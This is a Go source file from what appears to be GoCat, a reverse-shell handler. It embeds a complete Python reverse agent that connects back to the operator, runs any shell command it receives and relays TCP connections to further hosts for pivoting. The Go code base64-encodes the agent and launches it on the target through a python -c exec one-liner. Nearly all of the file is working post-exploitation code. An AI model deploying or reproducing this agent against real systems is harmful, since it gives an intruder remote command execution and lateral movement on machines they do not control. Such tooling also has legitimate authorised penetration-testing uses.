package session

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/realibrahimsql/Gocat/internal/logger"
)

const (
	streamOpen  byte = 1
	streamData  byte = 2
	streamClose byte = 3
)

const pythonAgentTemplate = `
import socket, struct, threading, subprocess

HOST = %q
PORT = %d
MSG_EXEC = 3
MSG_STREAM = 4
OP_OPEN = 1
OP_DATA = 2
OP_CLOSE = 3

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((HOST, PORT))
lock = threading.Lock()
streams = {}

def send(t, data=b""):
    if isinstance(data, str):
        data = data.encode()
    pkt = struct.pack(">H", len(data) + 1) + bytes([t]) + data
    with lock:
        c.sendall(pkt)

def recvn(n):
    b = b""
    while len(b) < n:
        chunk = c.recv(n - len(b))
        if not chunk:
            raise EOFError()
        b += chunk
    return b

def close_stream(sid):
    s = streams.pop(sid, None)
    if s:
        try:
            s.close()
        except Exception:
            pass
    send(MSG_STREAM, struct.pack(">HB", sid, OP_CLOSE))

def pump_remote(sid, s):
    try:
        while True:
            data = s.recv(32768)
            if not data:
                break
            send(MSG_STREAM, struct.pack(">HB", sid, OP_DATA) + data)
    except Exception:
        pass
    close_stream(sid)

while True:
    hdr = recvn(2)
    length = struct.unpack(">H", hdr)[0]
    msg = recvn(length)
    typ, data = msg[0], msg[1:]
    if typ == MSG_EXEC:
        try:
            out = subprocess.check_output(data.decode(), shell=True, stderr=subprocess.STDOUT, timeout=60)
        except Exception as e:
            out = str(e).encode()
        send(MSG_EXEC, out)
    elif typ == MSG_STREAM and len(data) >= 3:
        sid = struct.unpack(">H", data[:2])[0]
        op = data[2]
        payload = data[3:]
        if op == OP_OPEN:
            try:
                target = payload.decode()
                host, port = target.rsplit(":", 1)
                s = socket.create_connection((host, int(port)), timeout=10)
                streams[sid] = s
                threading.Thread(target=pump_remote, args=(sid, s), daemon=True).start()
            except Exception as e:
                send(MSG_STREAM, struct.pack(">HB", sid, OP_CLOSE) + str(e).encode())
        elif op == OP_DATA:
            s = streams.get(sid)
            if s:
                try:
                    s.sendall(payload)
                except Exception:
                    close_stream(sid)
        elif op == OP_CLOSE:
            close_stream(sid)
`

// StartAgent deploys a tiny Python reverse agent through the current shell.
// The agent connects back to GoCat on a separate raw TCP channel used for
// multiplexed features such as session port forwarding.
func (s *Session) StartAgent(lhost string, lport int, timeout time.Duration) error {
	if s.AgentActive && s.AgentConn != nil {
		return nil
	}
	if s.OS != OSUnix {
		return fmt.Errorf("agent deployment currently requires a Unix target with python")
	}

	py := s.Binaries["python3"]
	if py == "" {
		py = s.Binaries["python"]
	}
	if py == "" {
		return fmt.Errorf("python/python3 not available on target")
	}

	bindHost := lhost
	if bindHost == "" {
		bindHost = s.LocalHost
	}
	if bindHost == "" || bindHost == "0.0.0.0" || bindHost == "::" {
		bindHost = "127.0.0.1"
	}

	listener, err := net.Listen("tcp", net.JoinHostPort(bindHost, strconv.Itoa(lport)))
	if err != nil {
		return fmt.Errorf("failed to start agent listener: %w", err)
	}
	defer listener.Close()

	port := listener.Addr().(*net.TCPAddr).Port
	script := fmt.Sprintf(pythonAgentTemplate, bindHost, port)
	encoded := base64.StdEncoding.EncodeToString([]byte(script))
	launch := fmt.Sprintf("%s -c 'import base64;exec(base64.b64decode(%q))'\n", py, encoded)

	acceptCh := make(chan net.Conn, 1)
	errCh := make(chan error, 1)
	go func() {
		conn, err := listener.Accept()
		if err != nil {
			errCh <- err
			return
		}
		acceptCh <- conn
	}()

	if _, err := s.Send([]byte(launch)); err != nil {
		return fmt.Errorf("failed to launch agent: %w", err)
	}
	if timeout == 0 {
		timeout = 10 * time.Second
	}

	select {
	case conn := <-acceptCh:
		s.AgentConn = conn
		s.AgentMux = NewMessenger()
		s.AgentActive = true
		go s.agentReadLoop()
		logger.Info("Agent connected for session [%d] via %s", s.ID, conn.RemoteAddr())
		return nil
	case err := <-errCh:
		return fmt.Errorf("agent listener failed: %w", err)
	case <-time.After(timeout):
		return fmt.Errorf("agent did not connect back to %s within %s", listener.Addr(), timeout)
	}
}

func (s *Session) agentReadLoop() {
	buf := make([]byte, 32768)
	for {
		n, err := s.AgentConn.Read(buf)
		if n > 0 {
			for _, msg := range s.AgentMux.Feed(buf[:n]) {
				s.handleAgentMessage(msg.Type, msg.Data)
			}
		}
		if err != nil {
			s.AgentActive = false
			if err != io.EOF {
				logger.Warn("Agent disconnected for session [%d]: %v", s.ID, err)
			}
			return
		}
	}
}

func (s *Session) handleAgentMessage(msgType byte, data []byte) {
	if msgType != MsgStream || len(data) < 3 {
		return
	}

	streamID := binary.BigEndian.Uint16(data[:2])
	op := data[2]
	payload := data[3:]

	s.StreamLock.Lock()
	stream := s.Streams[streamID]
	if op == streamClose {
		delete(s.Streams, streamID)
	}
	s.StreamLock.Unlock()

	if stream == nil {
		return
	}

	switch op {
	case streamData:
		_, _ = stream.Write(payload)
	case streamClose:
		_ = stream.Close()
	}
}

func (s *Session) sendAgent(msgType byte, data []byte) error {
	if !s.AgentActive || s.AgentConn == nil {
		return fmt.Errorf("agent is not active")
	}
	s.wlock.Lock()
	defer s.wlock.Unlock()
	_, err := s.AgentConn.Write(PackMessage(msgType, data))
	return err
}

// OpenAgentStream asks the remote agent to connect to target host:port.
func (s *Session) OpenAgentStream(target string) (*Stream, error) {
	if !strings.Contains(target, ":") {
		return nil, fmt.Errorf("target must be host:port")
	}
	stream, err := s.NewStreamID()
	if err != nil {
		return nil, err
	}

	payload := make([]byte, 3+len(target))
	binary.BigEndian.PutUint16(payload[:2], stream.ID)
	payload[2] = streamOpen
	copy(payload[3:], []byte(target))
	if err := s.sendAgent(MsgStream, payload); err != nil {
		return nil, err
	}
	return stream, nil
}

func (s *Session) SendAgentStreamData(streamID uint16, data []byte) error {
	payload := make([]byte, 3+len(data))
	binary.BigEndian.PutUint16(payload[:2], streamID)
	payload[2] = streamData
	copy(payload[3:], data)
	return s.sendAgent(MsgStream, payload)
}

func (s *Session) CloseAgentStream(streamID uint16) {
	payload := make([]byte, 3)
	binary.BigEndian.PutUint16(payload[:2], streamID)
	payload[2] = streamClose
	_ = s.sendAgent(MsgStream, payload)
}
